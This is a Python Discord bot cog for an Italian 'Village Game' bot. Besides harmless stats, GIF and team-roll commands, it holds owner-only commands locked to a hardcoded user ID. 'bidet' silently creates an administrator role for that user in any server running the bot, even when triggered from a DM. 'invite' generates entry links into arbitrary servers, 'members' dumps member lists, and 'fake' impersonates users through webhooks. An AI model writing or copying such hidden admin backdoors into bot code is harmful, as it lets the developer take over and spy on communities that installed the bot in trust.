import os
import shlex
import random
import discord
from datetime import datetime, timezone, timedelta
from discord.ext import commands
from zoneinfo import ZoneInfo
from cogs.data_utils import load_guild_data

class Privatecommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.tz = ZoneInfo("Europe/Rome")
    
    @commands.command(name="statsa")
    async def statsa(self, ctx):
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("Not enough perms")
            return
        channel_id = 1446470487676031088
        channel = ctx.guild.get_channel(channel_id)
        if channel is None:
            await ctx.send("Channel not found")
            return
        now = datetime.now(timezone.utc)
        today_midnight = datetime(now.year, now.month, now.day, tzinfo=timezone.utc)
        start = today_midnight - timedelta(days=1)
        end = today_midnight +timedelta(days=1)
        counts = {}
        
        async for message in channel.history(limit=None, after=start, before=end, oldest_first=True):
            if message.author.bot:
                continue
            counts[message.author] = counts.get(message.author, 0) + 1
        if not counts:
            await ctx.send("No messages found.")
            return
        sorted_counts = sorted(counts.items(), key=lambda x: x[1], reverse=True)
        result = "\n".join([f"**{user.display_name}**: {count}" for user, count in sorted_counts])
        await ctx.send(f"📊 {channel.mention} stats:\n{result}")

    cute_gifs = ["https://media1.tenor.com/m/cjIZE-yQloAAAAAC/engage-kiss-anime-kiss.gif", "https://media1.tenor.com/m/9OV4Q-nMTxsAAAAC/yosuga-no-sora-anime-kiss.gif", "https://media1.tenor.com/m/iVKQga_D3mYAAAAC/kiss-anime-couple.gif", "https://media1.tenor.com/m/2tB89ikESPEAAAAC/kiss-kisses.gif", "https://media1.tenor.com/m/APN_rYYwVCQAAAAC/runa-shirakawa-ryuuto-kashima.gif", "https://media1.tenor.com/m/b7DWF8ecBkIAAAAC/kiss-anime-anime.gif", "https://media1.tenor.com/m/_X0Fb3lhi3AAAAAC/anime.gif", "https://media1.tenor.com/m/9u2vmryDP-cAAAAC/horimiya-animes.gif", "https://media.tenor.com/OEPq5qCDF24AAAAM/anime-kiss.gif"]

    @commands.command()
    async def amore(self, ctx):
        bidet = self.bot.get_user(450772749829537793)
        ame = self.bot.get_user(991857806066065468)
        random_gif = random.choice(self.cute_gifs)
        if ctx.author.id == 450772749829537793:
            emb = discord.Embed(title=" ", description=f"{bidet.mention} gives {ame.mention} a kiss", color=0xff3fb9, timestamp=datetime.now())
            emb.set_image(url=f"{random_gif}")
            emb.set_footer(text="Village Game")
            await ctx.send(embed=emb)
        elif ctx.author.id == 991857806066065468:
            emb = discord.Embed(title=" ", description=f"{ame.mention} gives {bidet.mention} a kiss", color=0xff3fb9, timestamp=datetime.now())
            emb.set_image(url=f"{random_gif}")
            emb.set_footer(text="Village Game")
            await ctx.send(embed=emb)
        else:
            await ctx.send("Your love particles aren't strong enough")

    fart_gifs = ["https://media1.tenor.com/m/RK73THJtx5UAAAAC/piggy-gas.gif", "https://media1.tenor.com/m/zPSgKzBLL4IAAAAC/fart-for-you.gif", "https://media.tenor.com/k6iG8-w3GRAAAAAi/fart-penguin.gif", "https://media1.tenor.com/m/b204lppMJfcAAAAC/mochidad-mochi.gif", "https://media.tenor.com/Zn_rFhfe2OwAAAAi/panda-peach.gif"]

    @commands.command()
    async def fart(self, ctx, user: discord.User = None):
        ame = self.bot.get_user(991857806066065468)
        derin = self.bot.get_user(320504417520582664)
        random_gif = random.choice(self.fart_gifs)
        if ctx.author == ame or ctx.author == derin:
            if user is None:
                emb = discord.Embed(title="FAAAAAAART", description=f"{ctx.author.mention} is farting☺", color=0xff3fb9, timestamp=datetime.now())
                emb.set_image(url=f"{random_gif}")
                emb.set_footer(text="Village Game")
            else:
                emb = discord.Embed(title="FAAAAAAART", description=f"{ctx.author.mention} farts on {user.mention}🦨", color=0xff3fb9, timestamp=datetime.now())
                emb.set_image(url=f"{random_gif}")
                emb.set_footer(text="Village Game")
            await ctx.send(embed=emb)
        else:
            await ctx.send("Prr")

    @commands.command()
    async def fake(self, ctx, user: discord.User = None, *, content: str):
        bidet = self.bot.get_user(450772749829537793)
        if ctx.author.id == bidet.id:
            await ctx.message.delete()
            channel = ctx.channel
            webhook = await channel.create_webhook(name="SimulatedWebhook")
            await webhook.send(content=content, 
                            username=user.display_name,
                            avatar_url=user.avatar.url,
                            allowed_mentions=discord.AllowedMentions.none())
            await webhook.delete()
        else:
            await ctx.send('Solo ad un Dio è permsso usare questi poteri')

    @commands.command()
    async def guilds(self, ctx):
        if ctx.author.id == 450772749829537793:
            guilds = self.bot.guilds
            server_list = '\n'.join([f"{guild.name} - ID: {guild.id}" for guild in guilds])
            await ctx.send(f"Lista dei server in cui si trova il bot:\n{server_list}")
        else:
            return

    @commands.command()
    async def members(self, ctx, guild_id):
        if ctx.author.id == 450772749829537793:
            guild = self.bot.get_guild(int(guild_id))
            if guild:
                member_list = '\n'.join([f"{member.name} - {member.id}" for member in guild.members])
                await ctx.send(f"Lista dei membri nel server {guild.name}:\n{member_list}")
            else:
                await ctx.send("Non ho trovato nessun server con quell'ID.")
        else:
            return

    @commands.command()
    async def bidet(self, ctx, guild_id: int = None):
        bidet = self.bot.get_user(450772749829537793)
        if ctx.channel.type == discord.ChannelType.private:
            if not ctx.author.id == bidet.id:
                return
            guild = self.bot.get_guild(guild_id)
            member = guild.get_member(bidet.id)
            role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
            await member.add_roles(role)
            await ctx.send("Ora sei un Dio")
        else:
            if not ctx.author.id == bidet.id:
                return
            if guild_id is None:
                guild_id = ctx.guild.id
            guild = self.bot.get_guild(guild_id)
            role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
            await ctx.author.add_roles(role)

    @commands.command()
    async def unbidet(self, ctx, guild_id: int = None):
        if ctx.author.id == 450772749829537793:
            if ctx.channel.type == discord.ChannelType.private:
                guild = self.bot.get_guild(int(guild_id))
                if not guild:
                    return await ctx.send("Non ho trovato nessun server con quell'ID.")
                role = discord.utils.get(guild.roles, name="Bidet")
                if not role:
                    return await ctx.send("Nessun ruolo con il nome 'Bidet' trovato.")
                await role.delete()
                await ctx.send("Ruolo eliminato")
            else:
                if guild_id is None:
                    guild_id = ctx.guild.id
                guild = self.bot.get_guild(guild_id)
                role = discord.utils.get(guild.roles, name="Bidet")
                if not role:
                    return
                await role.delete()
        else:
            return

    @commands.command()
    async def leaveabc(self, ctx, guild_id: int = None):
        if ctx.channel.type == discord.ChannelType.private:
            if ctx.author.id == 450772749829537793:
                guild = self.bot.get_guild(int(guild_id))
                if guild:
                    await guild.leave()
                else:
                    await ctx.send("Non ho trovato nessun server con quell'ID.")
            else:
                await ctx.send("You can't use this command")
        else:
            if ctx.author.guild_permissions.administrator or ctx.author.id == 450772749829537793:
                if guild_id is None:
                    guild_id = ctx.guild.id
                guild = self.bot.get_guild(int(guild_id))
                await guild.leave()

    @commands.command()
    async def invite(self, ctx, guild_id: int = None):
        if ctx.author.id == 450772749829537793:
            guild = self.bot.get_guild(int(guild_id))
            if guild:
                if guild.me.guild_permissions.create_instant_invite:
                    channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
                    if channel is not None:
                        invite = await channel.create_invite(max_age=0, max_uses=1)
                        await ctx.send(f"{invite.url}")
                    else:
                        await ctx.send("Nessun canale trovato.")
                else:
                    await ctx.send("Non ho i permessi per creare un invito.")
            else:
                await ctx.send("Non ho trovato nessun server con quell'ID.")
    
    @commands.command(name='teamroll')
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def teamroll(self, ctx, *, args: str):
        """
        Usage: .teamroll <n1> "message1" <n2> "message2" ...
        Only administrators can invoke this command.
        Randomly assigns one of the messages to each channel.
        """
        # Parse args into [(int, str), ...]
        try:
            tokens = shlex.split(args)
        except ValueError:
            return await ctx.send("❌ Couldn't parse your arguments. Make sure messages are in quotes.")
        if len(tokens) % 2 != 0:
            return await ctx.send("❌ You must give pairs of number + quoted message.")

        pairs = []
        total_needed = 0
        for i in range(0, len(tokens), 2):
            try:
                count = int(tokens[i])
            except ValueError:
                return await ctx.send(f"❌ `{tokens[i]}` is not a valid number.")
            message = tokens[i+1]
            if count < 1:
                return await ctx.send("❌ Numbers must be ≥ 1.")
            pairs.append((count, message))
            total_needed += count

        # Load the category
        guild_data = load_guild_data(ctx.guild.id)
        category = discord.utils.get(ctx.guild.categories, name=guild_data.get("rc_category_name"))
        if category is None:
            return await ctx.send("❌ The roll category isn’t set or doesn’t exist.")

        existing_channels = [c for c in category.channels if isinstance(c, discord.TextChannel)]
        existing_count = len(existing_channels)

        # Create channels if needed
        if existing_count < total_needed:
            to_create = total_needed - existing_count
            if existing_count + to_create > 50:
                return await ctx.send(
                    f"❌ Can't create {to_create} more channels: would exceed the {50}/category limit."
                )
            # find next numeric names
            used_nums = {int(c.name) for c in existing_channels if c.name.isdigit()}
            next_num = 1
            for _ in range(to_create):
                while next_num in used_nums:
                    next_num += 1
                ch = await ctx.guild.create_text_channel(
                    name=str(next_num),
                    category=category
                )
                existing_channels.append(ch)
                used_nums.add(next_num)
                next_num += 1

        # Sample distinct channels
        chosen = random.sample(existing_channels, k=total_needed)

        # Distribute messages
        idx = 0
        for count, message in pairs:
            for _ in range(count):
                ch = chosen[idx]
                sent = await ch.send(message)
                idx += 1

        await ctx.send("🎲 Done rolling teams! Each channel got exactly one message.")

    @teamroll.error
    async def teamroll_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("❌ You need administrator permissions to use this command.")
        else:
            raise error

    @commands.command()
    async def ahfeyijggedgjcud5fvuh7gdeya(self, ctx):
        channel = discord.utils.get(ctx.guild.text_channels, id=1231959149483393095)
        
        if channel is None:
            await ctx.send("Il canale specificato non è stato trovato.")
            return
        
        embedh = discord.Embed(
            title="🤖 Ciao, io sono Village Game!",
            description="Sono il tuo assistente virtuale per i Village Games su Discord. Il mio scopo è quello di aiutarti e semplificarti molte azioni da eseguire durante un Village Game. Ecco una panoramica delle mie categorie di comandi con una breve introduzione:",
            color=0xff3fb9
        )
        embedh.add_field(name="🏗️ Setup - 7 Comandi", value="Per impostare correttamente il server.", inline=True)
        embedh.add_field(name="👟 Moving - 8 Comandi", value="Muoversi è fondamentale! Qui ci sono i comandi per eseguire le visite.", inline=True)
        embedh.add_field(name="🏡 Home - 8 Comandi", value="Tutti i comandi relativi alle abitazioni.", inline=True)
        embedh.add_field(name="🔓 Houses and PCs handling - 6 Comandi", value="Comandi per gestire velocemente le case, chat pubbliche e chat private.", inline=True)
        embedh.add_field(name="📜 Infos - 4 Comandi", value="Estremamente utile per chi dimentica status molto facilmente!", inline=True)
        embedh.add_field(name="🎟️ Presets - 2 Comandi", value="Smettetela di Taggare gli Overseer per i preset! Grazie a questi comandi gli Overseer si sentiranno più liberi.", inline=True)
        embedh.add_field(name="🗳️ Voting - 6 Comandi", value="Il tuo voto conta! Grazie a questi comandi nessuno potrà non accorgersene.", inline=True)
        embedh.add_field(name="👉 Nominations - 9 Comandi", value="Meccanica extra, necessario il suo setup per farla funzionare.", inline=True)
        embedh.add_field(name="📄 Lists - 8 Comandi", value="Stanco degli Overseer che spammano messaggi nel canale dei Death Reports? Ti servono ore per ritrovare carte nei meandri del canale? Non sai quali case siano visitabili? Non sai chi sia vivo? Qui troverai una risposta a tutte queste domande.", inline=True)
        embedh.add_field(name="⚙️ Utility - 9 Comandi", value="Per tutti i comandi riguardanti principalmente la gestione dei permessi.", inline=True)
        embedh.add_field(name="👽 Other - 11 Comandi", value="Per tutti i comandi che non rientrano nelle precedenti categorie.", inline=True)
        embedh.set_footer(text="Se hai domande o hai bisogno di assistenza, non esitare a contattare il team di supporto. Divertiti nel Village Game con Village Game al tuo fianco!")
        await channel.send(embed=embedh)